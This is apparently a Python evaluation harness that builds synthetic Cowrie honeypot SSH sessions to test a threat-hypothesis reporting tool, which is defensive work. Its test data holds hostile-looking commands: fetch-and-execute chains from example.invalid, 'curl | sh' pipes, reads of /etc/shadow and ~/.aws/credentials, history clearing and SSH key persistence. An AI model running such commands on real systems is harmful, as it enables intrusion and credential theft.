"""Evaluate relationship-aware threat hypotheses on controlled synthetic cases.

The expected relationships are developer-authored from literal shell structure,
shared normalized entities, explicit Cowrie event metadata, and known command
outcomes. They are an implementation oracle, not expert validation of attacker
intent or field accuracy.
"""

from __future__ import annotations

import argparse
import csv
import json
import re
from collections import Counter
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Dict, Iterable, List, Mapping, Sequence, Tuple

from production.classification.classification_pipeline import split_compound_command
from production.reporting.threat_hypothesis import build_v2_report
from production.tools.threat_hypothesis_factuality_matrix import evaluate_matrix


SCHEMA_VERSION = "threat_hypothesis_relationship_evaluation.v1"
CONTROLLED_CASE_COUNT = 48
ALLOWED_EVIDENCE_STATUSES = {
    "supported",
    "partially_supported",
    "insufficient_evidence",
}
PROHIBITED_CERTAINTY_RE = re.compile(
    r"\b(?:confirmed attacker intent|confirmed compromise|will execute|"
    r"successfully compromised|definitive attribution)\b",
    re.IGNORECASE,
)


@dataclass
class ControlledScenario:
    scenario_id: str
    category: str
    payload: Dict[str, Any]
    expected_relationships: Tuple[str, ...] = ()
    expected_connected_claims: Tuple[str, ...] = ()
    forbidden_claim_types: Tuple[str, ...] = ()
    expected_chain_count: int = 0
    expected_abstained: bool = True
    expected_relationship_statuses: Mapping[str, str] = field(default_factory=dict)
    expected_evidence_diversity: Tuple[int, ...] = ()


def _timestamp(second: int) -> str:
    return f"2026-07-15T00:00:{second:02d}Z"


def _command(command: str, second: int, *, outcome: str = "unknown", cwd: str = "") -> Dict[str, Any]:
    eventid = {
        "success": "cowrie.command.success",
        "failure": "cowrie.command.failed",
    }.get(outcome, "cowrie.command.input")
    event: Dict[str, Any] = {
        "eventid": eventid,
        "input": command,
        "timestamp": _timestamp(second),
    }
    if cwd:
        event["cwd"] = cwd
    if outcome == "success":
        event["success"] = 1
    elif outcome == "failure":
        event["success"] = 0
    return event


def _transfer(
    second: int,
    *,
    eventid: str = "cowrie.session.file_download",
    path: str = "",
    url: str = "",
    digest: str = "",
) -> Dict[str, Any]:
    event: Dict[str, Any] = {"eventid": eventid, "timestamp": _timestamp(second)}
    if path:
        event["outfile"] = path
    if url:
        event["url"] = url
    if digest:
        event["shasum"] = digest
    return event


def _mapping(command: str) -> Tuple[str, str] | None:
    lowered = command.lower().strip()
    if re.search(r"\b(?:curl|wget)\b", lowered):
        return "T1105", "command-and-control"
    if re.search(r"\bchmod\b", lowered):
        return "T1222", "defense-evasion"
    if re.match(r"^(?:sudo\s+)?(?:sh|bash|python|python2|python3|perl|php|ruby|lua|node)\b", lowered):
        return "T1059", "execution"
    if lowered.startswith(("/", "./", "~/", "$")):
        return "T1059", "execution"
    if re.search(r"\b(?:whoami|id|uname|hostname)\b", lowered):
        return "T1033", "discovery"
    if re.search(r"(?:/etc/(?:passwd|shadow)|\.ssh/id_|\.aws/credentials|\.config/gcloud)", lowered):
        return "T1003", "credential-access"
    if "authorized_keys" in lowered or re.search(r"\b(?:useradd|adduser)\b", lowered):
        return "T1098", "persistence"
    if re.search(r"\bhistory\s+-c\b", lowered):
        return "T1070", "defense-evasion"
    return None


def _command_outcome(event: Mapping[str, Any]) -> str:
    if event.get("eventid") == "cowrie.command.success" or event.get("success") == 1:
        return "cowrie_reported_success"
    if event.get("eventid") == "cowrie.command.failed" or event.get("success") == 0:
        return "cowrie_reported_failure"
    return "outcome_unknown"


def _payload(session_id: str, raw_events: Sequence[Mapping[str, Any]]) -> Dict[str, Any]:
    commands: List[str] = []
    classifications: List[Dict[str, Any]] = []
    compound_index = 0
    for event in raw_events:
        eventid = str(event.get("eventid") or "")
        if eventid not in {
            "cowrie.command.input",
            "cowrie.command.success",
            "cowrie.command.failed",
        }:
            continue
        original = str(event.get("input") or "").strip()
        if not original:
            continue
        commands.append(original)
        fragments = split_compound_command(original)
        for fragment in fragments:
            mapped = _mapping(fragment.text)
            if not mapped:
                continue
            ttp, tactic = mapped
            classifications.append({
                "command": fragment.text,
                "subcommand": fragment.text,
                "original_command": original,
                "subcommand_index": fragment.index,
                "subcommand_count": fragment.count,
                "operator_before": fragment.operator_before,
                "operator_after": fragment.operator_after,
                "compound_command_index": compound_index,
                "ttp": ttp,
                "tactic": tactic,
                "source": "rule",
                "confidence": 1.0,
                "high_confidence": True,
                "agreement_status": "rule_only",
                "event_timestamp": str(event.get("timestamp") or ""),
                "cowrie_eventid": eventid,
                "command_outcome": _command_outcome(event),
                "outcome_scope": "compound_event" if fragment.count > 1 else "fragment",
                "evidence_id": f"class-{session_id}-{compound_index}-{fragment.index}",
            })
        compound_index += 1
    return {
        "session_id": session_id,
        "commands": commands,
        "classification_events": classifications,
        "raw_events": [dict(event) for event in raw_events],
    }


def _conditional_payload(
    session_id: str,
    operator: str,
    predecessor_outcome: str,
) -> Dict[str, Any]:
    original = f"whoami {operator} uname -a"
    event_timestamp = _timestamp(1)
    events = []
    for index, (command, ttp) in enumerate((("whoami", "T1033"), ("uname -a", "T1082"))):
        events.append({
            "command": command,
            "subcommand": command,
            "original_command": original,
            "subcommand_index": index,
            "subcommand_count": 2,
            "operator_before": operator if index == 1 else "",
            "operator_after": operator if index == 0 else "",
            "compound_command_index": 0,
            "ttp": ttp,
            "tactic": "discovery",
            "source": "rule",
            "confidence": 1.0,
            "high_confidence": True,
            "event_timestamp": event_timestamp,
            "command_outcome": predecessor_outcome if index == 0 else "outcome_unknown",
            "outcome_scope": "fragment",
            "evidence_id": f"class-{session_id}-{index}",
        })
    return {
        "session_id": session_id,
        "commands": [original],
        "classification_events": events,
        "raw_events": [],
    }


def _rel(relationship_type: str, entity_value: str = "") -> str:
    return f"{relationship_type}|{entity_value}"


def _scenario(
    scenario_id: str,
    category: str,
    events: Sequence[Mapping[str, Any]],
    **expectations: Any,
) -> ControlledScenario:
    return ControlledScenario(
        scenario_id=scenario_id,
        category=category,
        payload=_payload(scenario_id, events),
        **expectations,
    )


def build_controlled_scenarios() -> List[ControlledScenario]:
    scenarios: List[ControlledScenario] = []

    full_chains = [
        ("wget", "wget https://example.invalid/a.sh -O /tmp/a.sh", "chmod +x /tmp/a.sh", "sh /tmp/a.sh", "rm /tmp/a.sh", "/tmp/a.sh", True),
        ("curl", "curl https://example.invalid/b -o /var/tmp/b", "chmod 755 /var/tmp/b", "bash /var/tmp/b", "rm /var/tmp/b", "/var/tmp/b", True),
        ("python", "curl https://example.invalid/c --output /opt/c.py", "chmod +x /opt/c.py", "python3 /opt/c.py", "rm /opt/c.py", "/opt/c.py", True),
        ("direct", "wget https://example.invalid/d -O /tmp/d", "chmod +x /tmp/d", "/tmp/d", "rm /tmp/d", "/tmp/d", False),
    ]
    for index, (name, fetch, chmod, execute, delete, path, with_event) in enumerate(full_chains, 1):
        events: List[Dict[str, Any]] = [_command(fetch, 1)]
        if with_event:
            events.append(_transfer(2, path=path))
        events.extend([
            _command(chmod, 3, outcome="success"),
            _command(execute, 4),
            _command(delete, 5, outcome="success"),
        ])
        relationships = [
            _rel("artifact_permission_change", path),
            _rel("artifact_execution", path),
            _rel("artifact_deletion", path),
        ]
        if with_event:
            relationships.append(_rel("cowrie_transfer_observed", path))
        scenarios.append(_scenario(
            f"controlled-full-chain-{index:02d}-{name}",
            "connected_artifact_chain",
            events,
            expected_relationships=tuple(relationships),
            expected_connected_claims=("connected_artifact_activity",),
            expected_chain_count=1,
            expected_abstained=True,
        ))

    execution_pairs = [
        ("curl https://example.invalid/e -o /tmp/e", "sh /tmp/e", "/tmp/e"),
        ("wget https://example.invalid/f -O /tmp/f", "bash /tmp/f", "/tmp/f"),
        ("curl https://example.invalid/g -o /tmp/g.py", "python /tmp/g.py", "/tmp/g.py"),
        ("wget https://example.invalid/h -O /tmp/h", "/tmp/h", "/tmp/h"),
    ]
    for index, (fetch, execute, path) in enumerate(execution_pairs, 1):
        scenarios.append(_scenario(
            f"controlled-transfer-execute-{index:02d}",
            "connected_transfer_execution",
            [_command(fetch, 1), _command(execute, 2)],
            expected_relationships=(_rel("artifact_execution", path),),
            expected_connected_claims=("connected_transfer_execution",),
            forbidden_claim_types=("possible_artifact_execution",),
            expected_chain_count=1,
            expected_abstained=True,
        ))

    mismatch_cases = [
        ("different-files", "curl https://example.invalid/a -o /tmp/a", "sh /tmp/b"),
        ("same-basename", "curl https://example.invalid/a -o /tmp/a", "sh /var/tmp/a"),
        ("relative-absolute", "curl https://example.invalid/a -o ./a", "sh /tmp/a"),
        ("variable-absolute", "curl https://example.invalid/a -o $TMPDIR/a", "sh /tmp/a"),
        ("wildcard-absolute", "curl https://example.invalid/a -o /tmp/a*", "sh /tmp/a"),
        ("reverse-order", "sh /tmp/a", "curl https://example.invalid/a -o /tmp/a"),
    ]
    for index, (name, first, second) in enumerate(mismatch_cases, 1):
        scenarios.append(_scenario(
            f"controlled-no-link-{index:02d}-{name}",
            "artifact_non_match",
            [_command(first, 1), _command(second, 2)],
            forbidden_claim_types=("connected_transfer_execution",),
            expected_chain_count=0,
            expected_abstained=True,
        ))

    scenarios.extend([
        _scenario(
            "controlled-curl-semantics-01-webpage",
            "curl_semantics",
            [_command("curl https://example.invalid/", 1)],
            forbidden_claim_types=("possible_tool_transfer_or_staging",),
            expected_abstained=True,
        ),
        _scenario(
            "controlled-curl-semantics-02-output",
            "curl_semantics",
            [_command("curl https://example.invalid/a -o /tmp/a", 1)],
            expected_abstained=True,
        ),
        _scenario(
            "controlled-curl-semantics-03-pipe-sh",
            "curl_semantics",
            [_command("curl https://example.invalid/a | sh", 1)],
            expected_relationships=(_rel("piped_to"),),
            expected_connected_claims=("piped_remote_content_execution_attempt",),
            forbidden_claim_types=("possible_tool_transfer_or_staging",),
            expected_chain_count=1,
            expected_abstained=True,
        ),
        _scenario(
            "controlled-curl-semantics-04-pipe-bash",
            "curl_semantics",
            [_command("curl https://example.invalid/a | bash", 1)],
            expected_relationships=(_rel("piped_to"),),
            expected_connected_claims=("piped_remote_content_execution_attempt",),
            forbidden_claim_types=("possible_tool_transfer_or_staging",),
            expected_chain_count=1,
            expected_abstained=True,
        ),
    ])

    conditional_specs = [
        ("and-satisfied", "&&", "cowrie_reported_success", "conditional_successor", "supported", 1),
        ("and-unsatisfied", "&&", "cowrie_reported_failure", "conditional_successor", "partially_supported", 0),
        ("or-satisfied", "||", "cowrie_reported_failure", "conditional_failure_successor", "supported", 1),
        ("or-unsatisfied", "||", "cowrie_reported_success", "conditional_failure_successor", "partially_supported", 0),
        ("and-unknown", "&&", "outcome_unknown", "conditional_successor", "partially_supported", 1),
        ("or-unknown", "||", "outcome_unknown", "conditional_failure_successor", "partially_supported", 1),
    ]
    for index, (name, operator, outcome, relationship_type, status, chain_count) in enumerate(conditional_specs, 1):
        signature = _rel(relationship_type)
        scenarios.append(ControlledScenario(
            scenario_id=f"controlled-conditional-{index:02d}-{name}",
            category="shell_condition",
            payload=_conditional_payload(f"controlled-conditional-{index:02d}-{name}", operator, outcome),
            expected_relationships=(signature,),
            expected_chain_count=chain_count,
            expected_abstained=True,
            expected_relationship_statuses={signature: status},
        ))
    for index, (name, command) in enumerate((
        ("semicolon", "whoami; uname -a"),
        ("newline", "whoami\nuname -a"),
    ), 7):
        scenarios.append(_scenario(
            f"controlled-conditional-{index:02d}-{name}",
            "shell_sequence",
            [_command(command, 1)],
            expected_relationships=(_rel("explicit_sequence"),),
            expected_chain_count=0,
            expected_abstained=True,
        ))

    digest = "a" * 64
    transfer_cases = [
        ControlledScenario(
            "controlled-transfer-link-01-path",
            "cowrie_transfer_linkage",
            _payload("controlled-transfer-link-01-path", [
                _command("curl https://example.invalid/a -o /tmp/a", 1),
                _transfer(2, path="/tmp/a"),
            ]),
            expected_relationships=(_rel("cowrie_transfer_observed", "/tmp/a"),),
            expected_connected_claims=("observed_transfer_without_linked_execution",),
            forbidden_claim_types=("possible_artifact_execution",),
            expected_chain_count=1,
            expected_abstained=False,
        ),
        ControlledScenario(
            "controlled-transfer-link-02-url",
            "cowrie_transfer_linkage",
            _payload("controlled-transfer-link-02-url", [
                _command("wget https://example.invalid/b", 1),
                _transfer(2, url="https://example.invalid/b"),
            ]),
            expected_relationships=(_rel("cowrie_transfer_observed", "https://example.invalid/b"),),
            expected_connected_claims=("observed_transfer_without_linked_execution",),
            expected_chain_count=1,
            expected_abstained=False,
        ),
        ControlledScenario(
            "controlled-transfer-link-03-hash",
            "cowrie_transfer_linkage",
            _payload("controlled-transfer-link-03-hash", [
                _command(f"wget https://example.invalid/{digest}", 1),
                _transfer(2, digest=digest),
            ]),
            expected_relationships=(_rel("cowrie_transfer_observed", digest),),
            expected_connected_claims=("observed_transfer_without_linked_execution",),
            expected_chain_count=1,
            expected_abstained=False,
        ),
        _scenario(
            "controlled-transfer-link-04-metadata-insufficient",
            "cowrie_transfer_non_linkage",
            [_command("curl https://example.invalid/a -o /tmp/a", 1), _transfer(2)],
            expected_chain_count=0,
            expected_abstained=True,
        ),
        _scenario(
            "controlled-transfer-link-05-event-before-command",
            "cowrie_transfer_non_linkage",
            [_transfer(1, path="/tmp/a"), _command("curl https://example.invalid/a -o /tmp/a", 2)],
            expected_chain_count=0,
            expected_abstained=True,
        ),
        _scenario(
            "controlled-transfer-link-06-ambiguous-command",
            "cowrie_transfer_non_linkage",
            [
                _command("wget https://example.invalid/a", 1),
                _command("wget https://example.invalid/a", 2),
                _transfer(3, url="https://example.invalid/a"),
            ],
            expected_chain_count=0,
            expected_abstained=True,
        ),
        _scenario(
            "controlled-transfer-link-07-mismatched-metadata",
            "cowrie_transfer_non_linkage",
            [
                _command("curl https://example.invalid/a -o /tmp/a", 1),
                _transfer(2, path="/tmp/b", url="https://example.invalid/b"),
            ],
            expected_chain_count=0,
            expected_abstained=True,
        ),
        _scenario(
            "controlled-transfer-link-08-upload-independent",
            "cowrie_transfer_non_linkage",
            [_transfer(1, eventid="cowrie.session.file_upload", path="/tmp/upload")],
            expected_chain_count=0,
            expected_abstained=True,
        ),
    ]
    scenarios.extend(transfer_cases)

    scenarios.extend([
        _scenario(
            "controlled-session-structure-01-duplicates",
            "session_structure",
            [
                _command("curl https://example.invalid/a -o /tmp/a", 1),
                _command("curl https://example.invalid/a -o /tmp/a", 2),
                _command("chmod +x /tmp/a", 3),
            ],
            expected_relationships=(_rel("artifact_permission_change", "/tmp/a"),),
            expected_connected_claims=("connected_transfer_permission_change",),
            expected_chain_count=1,
            expected_abstained=False,
            expected_evidence_diversity=(2,),
        ),
        _scenario(
            "controlled-session-structure-02-unrelated",
            "session_structure",
            [
                _command("whoami", 1),
                _command("cat /etc/passwd", 2),
                _command("history -c", 3),
            ],
            expected_chain_count=0,
            expected_abstained=True,
        ),
        _scenario(
            "controlled-session-structure-03-two-chains",
            "session_structure",
            [
                _command("curl https://example.invalid/a -o /tmp/a", 1),
                _command("chmod +x /tmp/a", 2),
                _command("wget https://example.invalid/b -O /tmp/b", 3),
                _command("sh /tmp/b", 4),
            ],
            expected_relationships=(
                _rel("artifact_permission_change", "/tmp/a"),
                _rel("artifact_execution", "/tmp/b"),
            ),
            expected_connected_claims=(
                "connected_transfer_permission_change",
                "connected_transfer_execution",
            ),
            expected_chain_count=2,
            expected_abstained=False,
        ),
        _scenario(
            "controlled-session-structure-04-unrelated-final",
            "session_structure",
            [
                _command("curl https://example.invalid/a -o /tmp/a", 1),
                _transfer(2, path="/tmp/a"),
                _command("whoami", 3),
            ],
            expected_relationships=(_rel("cowrie_transfer_observed", "/tmp/a"),),
            expected_connected_claims=("observed_transfer_without_linked_execution",),
            expected_chain_count=1,
            expected_abstained=False,
        ),
    ])

    account_cases = [
        _scenario(
            "controlled-entity-01-account-match",
            "account_and_credential_entities",
            [
                _command("useradd alice", 1),
                _command("echo ssh-ed25519 AAAA >> /home/alice/.ssh/authorized_keys", 2),
            ],
            expected_relationships=(_rel("account_modified", "alice"),),
            expected_chain_count=1,
            expected_abstained=True,
        ),
        _scenario(
            "controlled-entity-02-account-mismatch",
            "account_and_credential_entities",
            [
                _command("useradd alice", 1),
                _command("echo ssh-ed25519 AAAA >> /home/bob/.ssh/authorized_keys", 2),
            ],
            expected_chain_count=0,
            expected_abstained=True,
        ),
        _scenario(
            "controlled-entity-03-shadow",
            "account_and_credential_entities",
            [_command("cat /etc/shadow", 1)],
            expected_chain_count=0,
            expected_abstained=True,
        ),
        _scenario(
            "controlled-entity-04-cloud-credentials",
            "account_and_credential_entities",
            [_command("cat ~/.aws/credentials", 1)],
            expected_chain_count=0,
            expected_abstained=True,
        ),
    ]
    scenarios.extend(account_cases)

    outcome_cases = [
        _scenario(
            "controlled-outcome-01-failed-transfer-with-event",
            "outcome_semantics",
            [
                _command("curl https://example.invalid/a -o /tmp/a", 1, outcome="failure"),
                _transfer(2, path="/tmp/a"),
            ],
            expected_relationships=(_rel("cowrie_transfer_observed", "/tmp/a"),),
            expected_connected_claims=("observed_transfer_without_linked_execution",),
            expected_chain_count=1,
            expected_abstained=False,
            expected_relationship_statuses={
                _rel("cowrie_transfer_observed", "/tmp/a"): "partially_supported"
            },
        ),
        _scenario(
            "controlled-outcome-02-failed-chmod",
            "outcome_semantics",
            [
                _command("wget https://example.invalid/a -O /tmp/a", 1),
                _command("chmod +x /tmp/a", 2, outcome="failure"),
            ],
            expected_relationships=(_rel("artifact_permission_change", "/tmp/a"),),
            expected_connected_claims=("connected_transfer_permission_change",),
            expected_chain_count=1,
            expected_abstained=False,
            expected_relationship_statuses={
                _rel("artifact_permission_change", "/tmp/a"): "partially_supported"
            },
        ),
        _scenario(
            "controlled-outcome-03-failed-execution",
            "outcome_semantics",
            [
                _command("wget https://example.invalid/a -O /tmp/a", 1),
                _command("sh /tmp/a", 2, outcome="failure"),
            ],
            expected_relationships=(_rel("artifact_execution", "/tmp/a"),),
            expected_connected_claims=("connected_transfer_execution",),
            forbidden_claim_types=("possible_artifact_execution",),
            expected_chain_count=1,
            expected_abstained=True,
            expected_relationship_statuses={
                _rel("artifact_execution", "/tmp/a"): "partially_supported"
            },
        ),
        _scenario(
            "controlled-outcome-04-successful-execution",
            "outcome_semantics",
            [
                _command("wget https://example.invalid/a -O /tmp/a", 1),
                _command("sh /tmp/a", 2, outcome="success"),
            ],
            expected_relationships=(_rel("artifact_execution", "/tmp/a"),),
            expected_connected_claims=("connected_transfer_execution",),
            expected_chain_count=1,
            expected_abstained=True,
        ),
        ControlledScenario(
            "controlled-outcome-05-audit-only",
            "outcome_semantics",
            {
                "session_id": "controlled-outcome-05-audit-only",
                "commands": ["rm /tmp/a"],
                "classification_events": [{
                    "command": "rm /tmp/a",
                    "ttp": "T1562",
                    "tactic": "defense-evasion",
                    "source": "securebert_low_confidence",
                    "confidence": 0.2,
                    "high_confidence": False,
                    "evidence_id": "weak-t1562",
                }],
                "raw_events": [_command("rm /tmp/a", 1)],
            },
            forbidden_claim_types=("possible_trace_removal",),
            expected_chain_count=0,
            expected_abstained=True,
        ),
        _scenario(
            "controlled-outcome-06-transfer-event-only",
            "outcome_semantics",
            [_transfer(1, path="/tmp/a")],
            forbidden_claim_types=("possible_artifact_execution",),
            expected_chain_count=0,
            expected_abstained=True,
        ),
    ]
    scenarios.extend(outcome_cases)

    if len(scenarios) != CONTROLLED_CASE_COUNT:
        raise AssertionError(
            f"Controlled benchmark must contain {CONTROLLED_CASE_COUNT} cases, got {len(scenarios)}"
        )
    if len({item.scenario_id for item in scenarios}) != len(scenarios):
        raise AssertionError("Controlled scenario IDs must be unique")
    return scenarios


def _relationship_signature(relationship: Mapping[str, Any]) -> str:
    return _rel(
        str(relationship.get("relationship_type") or ""),
        str(relationship.get("entity_value") or ""),
    )


def _all_claims(report: Mapping[str, Any]) -> List[Dict[str, Any]]:
    assessment = report.get("supported_assessment") or {}
    follow_on = report.get("follow_on_hypothesis") or {}
    return [
        dict(item)
        for item in list(assessment.get("possible_objectives") or [])
        + list(follow_on.get("claims") or [])
        if isinstance(item, dict)
    ]


def _valid_evidence_refs(observed: Mapping[str, Any]) -> set[str]:
    refs: set[str] = set()
    for field_name in (
        "ordered_behavior_chain",
        "ordered_command_observations",
        "transfer_event_observations",
        "cowrie_event_evidence",
    ):
        for item in observed.get(field_name) or []:
            if not isinstance(item, dict):
                continue
            evidence_id = str(item.get("evidence_id") or "")
            if evidence_id:
                refs.add(evidence_id)
            refs.update(
                str(value)
                for value in item.get("source_evidence_refs") or []
                if str(value)
            )
    return refs


def evaluate_scenario(scenario: ControlledScenario) -> Dict[str, Any]:
    report = build_v2_report(
        {},
        [scenario.payload],
        raw_events=list(scenario.payload.get("raw_events") or []),
    )
    observed = report["observed_behavior"]
    relationships = [
        dict(item)
        for item in observed.get("behavior_relationships") or []
        if isinstance(item, dict)
    ]
    actual_relationships = Counter(_relationship_signature(item) for item in relationships)
    expected_relationships = Counter(scenario.expected_relationships)
    true_positive = sum((actual_relationships & expected_relationships).values())
    false_positive = sum((actual_relationships - expected_relationships).values())
    false_negative = sum((expected_relationships - actual_relationships).values())

    connected_claims = Counter(
        str(item.get("claim_type") or "")
        for item in report["supported_assessment"].get("connected_behavior_claims") or []
        if isinstance(item, dict)
    )
    expected_connected_claims = Counter(scenario.expected_connected_claims)
    all_claims = _all_claims(report)
    all_claim_types = {str(item.get("claim_type") or "") for item in all_claims}
    forbidden_found = sorted(set(scenario.forbidden_claim_types) & all_claim_types)

    valid_refs = _valid_evidence_refs(observed)
    relationship_refs_valid = all(
        str(item.get(field_name) or "") in valid_refs
        for item in relationships
        for field_name in ("source_evidence_ref", "target_evidence_ref")
    )
    claim_refs_valid = all(
        bool(item.get("evidence_refs"))
        and all(str(ref) in valid_refs for ref in item.get("evidence_refs") or [])
        for item in all_claims
    )
    claim_statuses_valid = all(
        str(item.get("evidence_status") or "") in ALLOWED_EVIDENCE_STATUSES
        for item in all_claims
    )
    relationship_semantics_valid = all(
        item.get("causality_semantics") == "evidence_link_not_causal_proof"
        for item in relationships
    )
    prohibited_language = [
        str(item.get("text") or "")
        for item in all_claims
        if PROHIBITED_CERTAINTY_RE.search(str(item.get("text") or ""))
    ]
    status_failures = []
    for signature, expected_status in scenario.expected_relationship_statuses.items():
        matching = [
            item for item in relationships
            if _relationship_signature(item) == signature
        ]
        if not matching or any(item.get("relationship_status") != expected_status for item in matching):
            status_failures.append(signature)

    chains = [
        dict(item)
        for item in observed.get("connected_behavior_chains") or []
        if isinstance(item, dict)
    ]
    actual_diversity = tuple(sorted(int(item.get("evidence_diversity_count") or 0) for item in chains))
    diversity_passed = (
        not scenario.expected_evidence_diversity
        or actual_diversity == tuple(sorted(scenario.expected_evidence_diversity))
    )
    abstained = bool(report["follow_on_hypothesis"].get("abstained"))
    checks = {
        "relationship_set_exact": actual_relationships == expected_relationships,
        "connected_claim_set_exact": connected_claims == expected_connected_claims,
        "forbidden_claims_absent": not forbidden_found,
        "connected_chain_count_correct": len(chains) == scenario.expected_chain_count,
        "abstention_correct": abstained == scenario.expected_abstained,
        "relationship_status_correct": not status_failures,
        "relationship_evidence_refs_valid": relationship_refs_valid,
        "claim_evidence_refs_valid": claim_refs_valid,
        "claim_statuses_valid": claim_statuses_valid,
        "relationship_semantics_non_causal": relationship_semantics_valid,
        "prohibited_certainty_absent": not prohibited_language,
        "duplicate_evidence_diversity_correct": diversity_passed,
    }
    return {
        "scenario_id": scenario.scenario_id,
        "category": scenario.category,
        "expected_relationship_types": sorted(
            signature.split("|", 1)[0]
            for signature in expected_relationships.elements()
        ),
        "actual_relationship_types": sorted(
            signature.split("|", 1)[0]
            for signature in actual_relationships.elements()
        ),
        "relationship_true_positive": true_positive,
        "relationship_false_positive": false_positive,
        "relationship_false_negative": false_negative,
        "expected_connected_claims": sorted(expected_connected_claims.elements()),
        "actual_connected_claims": sorted(connected_claims.elements()),
        "forbidden_claim_types_found": forbidden_found,
        "expected_chain_count": scenario.expected_chain_count,
        "actual_chain_count": len(chains),
        "expected_abstained": scenario.expected_abstained,
        "actual_abstained": abstained,
        "claim_count": len(all_claims),
        "claims_with_valid_evidence_refs": sum(
            bool(item.get("evidence_refs"))
            and all(str(ref) in valid_refs for ref in item.get("evidence_refs") or [])
            for item in all_claims
        ),
        "checks": checks,
        "passed": all(checks.values()),
    }


def _ratio(numerator: int, denominator: int) -> float | None:
    return round(numerator / denominator, 6) if denominator else None


def evaluate_controlled_benchmark() -> Dict[str, Any]:
    results = [evaluate_scenario(item) for item in build_controlled_scenarios()]
    relationship_tp = sum(item["relationship_true_positive"] for item in results)
    relationship_fp = sum(item["relationship_false_positive"] for item in results)
    relationship_fn = sum(item["relationship_false_negative"] for item in results)
    precision = _ratio(relationship_tp, relationship_tp + relationship_fp)
    recall = _ratio(relationship_tp, relationship_tp + relationship_fn)
    f1 = (
        round(2 * precision * recall / (precision + recall), 6)
        if precision is not None and recall is not None and precision + recall
        else None
    )
    claims_total = sum(item["claim_count"] for item in results)
    valid_claim_refs = sum(item["claims_with_valid_evidence_refs"] for item in results)
    abstention_correct = sum(item["checks"]["abstention_correct"] for item in results)
    overclaim_free = sum(
        item["checks"]["forbidden_claims_absent"]
        and item["checks"]["prohibited_certainty_absent"]
        for item in results
    )
    factuality = evaluate_matrix()
    categories: Dict[str, Dict[str, int]] = {}
    for result in results:
        bucket = categories.setdefault(result["category"], {"cases": 0, "passed": 0})
        bucket["cases"] += 1
        bucket["passed"] += int(result["passed"])
    return {
        "schema_version": SCHEMA_VERSION,
        "scope": "Cowrie honeypot-observable SSH behavior",
        "evaluation_type": "developer_authored_controlled_functional_evaluation",
        "ground_truth_status": (
            "deterministic implementation oracle from explicit shell structure, shared entities, "
            "Cowrie event metadata, and known outcomes; not expert validation or attacker-intent ground truth"
        ),
        "case_count": len(results),
        "passed": sum(item["passed"] for item in results),
        "failed": sum(not item["passed"] for item in results),
        "metrics": {
            "relationship_true_positive": relationship_tp,
            "relationship_false_positive": relationship_fp,
            "relationship_false_negative": relationship_fn,
            "relationship_precision": precision,
            "relationship_recall": recall,
            "relationship_f1": f1,
            "false_link_rate": _ratio(relationship_fp, relationship_tp + relationship_fp),
            "scenario_pass_rate": _ratio(sum(item["passed"] for item in results), len(results)),
            "claim_evidence_reference_correctness": _ratio(valid_claim_refs, claims_total),
            "abstention_appropriateness": _ratio(abstention_correct, len(results)),
            "overclaim_free_case_rate": _ratio(overclaim_free, len(results)),
        },
        "existing_factuality_matrix": {
            "scenario_count": factuality["scenario_count"],
            "passed": factuality["passed"],
            "failed": factuality["failed"],
            "validation_status": factuality["ground_truth_status"],
        },
        "category_summary": categories,
        "results": results,
        "limitations": [
            "Synthetic cases test supported parser and claim behavior, not field accuracy or analyst usefulness.",
            "Expected results were authored by the project developer and were not independently expert-reviewed.",
            "Relationship recall applies only to the explicitly represented controlled patterns.",
            "The benchmark does not establish attacker intent, real-host impact, or complete shell understanding.",
        ],
    }


def write_outputs(document: Mapping[str, Any], json_path: Path, csv_path: Path) -> None:
    json_path.parent.mkdir(parents=True, exist_ok=True)
    csv_path.parent.mkdir(parents=True, exist_ok=True)
    json_path.write_text(json.dumps(document, indent=2, sort_keys=True) + "\n", encoding="utf-8")
    with csv_path.open("w", encoding="utf-8", newline="") as handle:
        writer = csv.DictWriter(handle, fieldnames=[
            "scenario_id",
            "category",
            "passed",
            "relationship_true_positive",
            "relationship_false_positive",
            "relationship_false_negative",
            "expected_chain_count",
            "actual_chain_count",
            "expected_abstained",
            "actual_abstained",
            "failed_checks",
        ], lineterminator="\n")
        writer.writeheader()
        for result in document["results"]:
            writer.writerow({
                "scenario_id": result["scenario_id"],
                "category": result["category"],
                "passed": str(result["passed"]).lower(),
                "relationship_true_positive": result["relationship_true_positive"],
                "relationship_false_positive": result["relationship_false_positive"],
                "relationship_false_negative": result["relationship_false_negative"],
                "expected_chain_count": result["expected_chain_count"],
                "actual_chain_count": result["actual_chain_count"],
                "expected_abstained": str(result["expected_abstained"]).lower(),
                "actual_abstained": str(result["actual_abstained"]).lower(),
                "failed_checks": ",".join(
                    name for name, passed in result["checks"].items() if not passed
                ),
            })


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument(
        "--json-output",
        default="evaluation/threat_hypothesis_relationship_evaluation.json",
    )
    parser.add_argument(
        "--csv-output",
        default="evaluation/threat_hypothesis_relationship_evaluation.csv",
    )
    args = parser.parse_args()
    document = evaluate_controlled_benchmark()
    write_outputs(document, Path(args.json_output), Path(args.csv_output))
    print(json.dumps({
        "case_count": document["case_count"],
        "passed": document["passed"],
        "failed": document["failed"],
        "metrics": document["metrics"],
        "outputs": [args.json_output, args.csv_output],
    }, indent=2, sort_keys=True))
    return 0 if document["failed"] == 0 else 1


if __name__ == "__main__":
    raise SystemExit(main())
